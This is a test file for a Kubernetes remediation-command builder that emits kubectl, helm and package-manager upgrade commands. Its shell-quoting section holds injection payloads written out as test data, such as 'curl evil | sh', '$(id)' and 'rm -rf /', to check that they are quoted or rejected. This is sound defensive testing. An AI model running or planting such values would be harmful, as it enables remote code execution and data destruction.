/**
 * The delivery rules of remediation phase 2. As with the upgrade
 * recommendations, the load-bearing assertions are the refusals: a
 * `kubectl set image deployment/x` for a StatefulSet — or for a cluster we
 * were not allowed to inspect — is worse than no command at all.
 */

import { describe, it, expect } from "vitest";
import {
    dependencyBumpCommand,
    buildDelivery,
    buildReleaseUpgradeCommand,
    buildValuesOverride,
    retagImageRef,
    type DeliveryInput,
} from "../../../src/lib/remediation-commands.js";

function input(overrides: Partial<DeliveryInput> = {}): DeliveryInput {
    return {
        workload: { name: "api", kind: "Deployment", namespace: "default" },
        containerName: "api",
        imageRef: "nginx:1.25.2",
        currentTag: "1.25.2",
        targetTag: "1.25.6",
        release: null,
        application: null,
        ownerMetadataKnown: true,
        ...overrides,
    };
}

describe("buildDelivery", () => {
    it("emits kubectl set image for an unmanaged Deployment", () => {
        const d = buildDelivery(input());
        expect(d.method).toBe("kubectl");
        expect(d.command).toBe("kubectl set image deployment/api api=nginx:1.25.6 -n default");
        expect(d.caveat).toBeNull();
    });

    it("uses the workload's real kind, lowercased", () => {
        const d = buildDelivery(input({ workload: { name: "db", kind: "StatefulSet", namespace: "data" } }));
        expect(d.command).toBe("kubectl set image statefulset/db api=nginx:1.25.6 -n data");
    });

    it("emits no kubectl command when the kind is unresolved", () => {
        const d = buildDelivery(input({ workload: { name: "api", kind: null, namespace: "default" } }));
        expect(d.command).toBeNull();
        expect(d.caveat).toMatch(/kind/i);
    });

    it("never claims 'unmanaged' when owner metadata was not collected", () => {
        const d = buildDelivery(input({ ownerMetadataKnown: false }));
        expect(d.method).toBe("unknown");
        expect(d.command).toBeNull();
        expect(d.summary).not.toMatch(/not chart-managed/i);
    });

    it("refuses an in-place bump for kinds where it does not take effect", () => {
        for (const kind of ["Job", "ReplicaSet", "Pod"]) {
            const d = buildDelivery(input({ workload: { name: "x", kind, namespace: "ns" } }));
            expect(d.command).toBeNull();
        }
    });

    it("prefers helm for a chart-managed workload, in the release's namespace", () => {
        const d = buildDelivery(
            input({
                release: {
                    name: "web",
                    namespace: "infra", // the release's own namespace, not the workload's
                    chartName: "nginx",
                    chartVersion: "18.2.1",
                },
            }),
        );
        expect(d.method).toBe("helm");
        expect(d.command).toBe("helm upgrade web -n infra --reuse-values --set image.tag=1.25.6");
        expect(d.caveat).toMatch(/image\.tag/);
    });

    it("routes a GitOps-delivered workload to its source, with no imperative command", () => {
        const d = buildDelivery(
            input({
                release: { name: "web", namespace: "infra", chartName: "nginx", chartVersion: "18.2.1" },
                application: {
                    tool: "argocd",
                    name: "web",
                    namespace: "argocd",
                    repoUrl: "https://github.com/acme/deploy",
                    targetRevision: "main",
                    chart: null,
                    path: "apps/web",
                },
            }),
        );
        expect(d.method).toBe("argocd");
        expect(d.command).toBeNull();
        expect(d.summary).toContain("apps/web");
        expect(d.summary).toMatch(/reverted/);
    });

    it("emits nothing pasteable without a measured target tag", () => {
        const d = buildDelivery(input({ targetTag: null }));
        expect(d.command).toBeNull();
        expect(d.caveat).toMatch(/target tag/i);
    });
});

describe("retagImageRef", () => {
    it("edits the verbatim ref when it ends in the current tag", () => {
        expect(retagImageRef("ghcr.io/acme/api:1.2.3", "1.2.3", "1.2.9")).toBe("ghcr.io/acme/api:1.2.9");
        // A registry with a port must not be mistaken for a tag separator.
        expect(retagImageRef("registry:5000/api:1.2.3", "1.2.3", "1.2.9")).toBe("registry:5000/api:1.2.9");
    });

    it("re-tags a digest-pinned ref from its repository half", () => {
        expect(retagImageRef("nginx@sha256:abc", null, "1.25.6")).toBe("nginx:1.25.6");
    });
});

describe("buildReleaseUpgradeCommand", () => {
    it("pins the chart version explicitly", () => {
        expect(
            buildReleaseUpgradeCommand(
                { name: "monitoring", namespace: "obs", chartName: "kube-prometheus-stack", chartVersion: "82.18.0" },
                "83.1.0",
            ),
        ).toBe("helm upgrade monitoring -n obs --reuse-values --version 83.1.0");
    });
});

describe("buildValuesOverride", () => {
    it("emits an image.tag snippet with the honest caveats attached", () => {
        const override = buildValuesOverride({ repository: "library/nginx", targetTag: "1.25.6" });
        expect(override.snippet).toContain('tag: "1.25.6"');
        expect(override.snippet).toContain("library/nginx");
        // The two things that make the snippet a starting point, not an
        // answer: we cannot see the values schema, and an override the chart
        // does not parameterise is reverted on the next sync.
        expect(override.caveat).toMatch(/values schema/i);
        expect(override.caveat).toMatch(/reverted/i);
    });
});

/*
 * Hostile-name quoting (security review S10). Names reaching this module are
 * scanner-supplied; the inventory schema rejects them at ingest, but the
 * command builder must be safe on its own — a forged row already in the
 * database must still render as one harmless shell word.
 */
describe("shell quoting of scanner-supplied values", () => {
    const hostileName = "web; curl evil | sh #";

    it("quotes a hostile workload name in kubectl set image", () => {
        const d = buildDelivery(input({ workload: { name: hostileName, kind: "Deployment", namespace: "default" } }));
        expect(d.command).toBe(`kubectl set image 'deployment/web; curl evil | sh #' api=nginx:1.25.6 -n default`);
    });

    it("quotes a hostile release name and namespace in helm upgrade", () => {
        const d = buildDelivery(
            input({
                release: {
                    name: "app$(id)",
                    namespace: "ns`whoami`",
                    chartName: "app",
                    chartVersion: "1.0.0",
                },
            }),
        );
        expect(d.command).toBe("helm upgrade 'app$(id)' -n 'ns`whoami`' --reuse-values --set image.tag=1.25.6");
    });

    it("quotes a hostile target tag reaching --set", () => {
        const d = buildDelivery(
            input({
                targetTag: "1.25.6 --set malicious=true",
                release: { name: "app", namespace: "default", chartName: "app", chartVersion: "1.0.0" },
            }),
        );
        expect(d.command).toBe(
            "helm upgrade app -n default --reuse-values --set 'image.tag=1.25.6 --set malicious=true'",
        );
    });

    it("survives single quotes inside the hostile value", () => {
        const d = buildDelivery(
            input({
                release: { name: "it's", namespace: "default", chartName: null, chartVersion: null },
            }),
        );
        expect(d.command).toBe(`helm upgrade 'it'\\''s' -n default --reuse-values --set image.tag=1.25.6`);
    });

    it("leaves ordinary names unquoted", () => {
        const cmd = buildReleaseUpgradeCommand(
            { name: "prometheus", namespace: "monitoring", chartName: null, chartVersion: null },
            "61.1.0",
        );
        expect(cmd).toBe("helm upgrade prometheus -n monitoring --reuse-values --version 61.1.0");
    });

    it("quotes a hostile chart version in the release upgrade command", () => {
        const cmd = buildReleaseUpgradeCommand(
            { name: "app", namespace: "default", chartName: null, chartVersion: null },
            "1.0.0; rm -rf /",
        );
        expect(cmd).toBe("helm upgrade app -n default --reuse-values --version '1.0.0; rm -rf /'");
    });

    it("emits the values override through the yaml library, quoted", () => {
        const o = buildValuesOverride({ repository: "nginx", targetTag: '1.25.6"\nmalicious: true' });
        // The tag stays one double-quoted YAML scalar — the newline is escaped,
        // never a new document line.
        expect(o.snippet).toContain('tag: "1.25.6\\"\\nmalicious: true"');
        expect(o.snippet.split("\n").some((l) => l.startsWith("malicious"))).toBe(false);
    });

    it("strips newlines from the repository comment in the values override", () => {
        const o = buildValuesOverride({ repository: "nginx\nmalicious: true", targetTag: "1.25.6" });
        expect(o.snippet.split("\n")[0]).toBe(
            "# Override the image tag for nginxmalicious: true in this release's values.",
        );
    });
});

describe("dependencyBumpCommand", () => {
    const TABLE: Array<[label: string, input: Parameters<typeof dependencyBumpCommand>[0], expected: string | null]> = [
        [
            "npm",
            { purl: "pkg:npm/lodash@4.17.20", name: "lodash", fixedVersion: "4.17.21" },
            "npm install lodash@4.17.21",
        ],
        [
            "a scoped npm package",
            { purl: "pkg:npm/%40babel/traverse@7.0.0", name: "@babel/traverse", fixedVersion: "7.23.2" },
            "npm install @babel/traverse@7.23.2",
        ],
        [
            "pip",
            { purl: "pkg:pypi/requests@2.31.0", name: "requests", fixedVersion: "2.32.4" },
            "pip install requests==2.32.4",
        ],
        [
            "go, adding the v OSV leaves off",
            { purl: "pkg:golang/golang.org/x/net@v0.20.0", name: "golang.org/x/net", fixedVersion: "0.38.0" },
            "go get golang.org/x/net@v0.38.0",
        ],
        [
            "go, keeping a v that is there",
            { purl: "pkg:golang/golang.org/x/net@v0.20.0", name: "golang.org/x/net", fixedVersion: "v0.38.0" },
            "go get golang.org/x/net@v0.38.0",
        ],
        [
            "gem, through Bundler",
            { purl: "pkg:gem/nokogiri@1.15.0", name: "nokogiri", fixedVersion: "1.16.5" },
            "bundle update nokogiri --conservative",
        ],

        [
            "no fixed version renders nothing",
            { purl: "pkg:npm/lodash@4.17.20", name: "lodash", fixedVersion: null },
            null,
        ],
        ["no purl renders nothing", { purl: null, name: "lodash", fixedVersion: "4.17.21" }, null],
        [
            "maven pins in a manifest we cannot see",
            {
                purl: "pkg:maven/org.apache.logging.log4j/log4j-core@2.14.0",
                name: "log4j-core",
                fixedVersion: "2.17.1",
            },
            null,
        ],
        [
            "a distro package is the base image's",
            { purl: "pkg:deb/debian/openssl@3.0.11", name: "openssl", fixedVersion: "3.0.13" },
            null,
        ],
        [
            "the Go standard library is the toolchain's",
            { purl: "pkg:golang/stdlib@1.21.0", name: "stdlib", fixedVersion: "1.21.8" },
            null,
        ],
        [
            "uploaded content never reaches a shell line",
            { purl: "pkg:npm/x@1.0.0", name: "x; rm -rf /", fixedVersion: "1.0.1" },
            null,
        ],
        ["nor through the version", { purl: "pkg:npm/x@1.0.0", name: "x", fixedVersion: "1.0.1 && curl evil" }, null],
    ];

    it.each(TABLE)("%s", (_label, input, expected) => {
        expect(dependencyBumpCommand(input)).toBe(expected);
    });
});
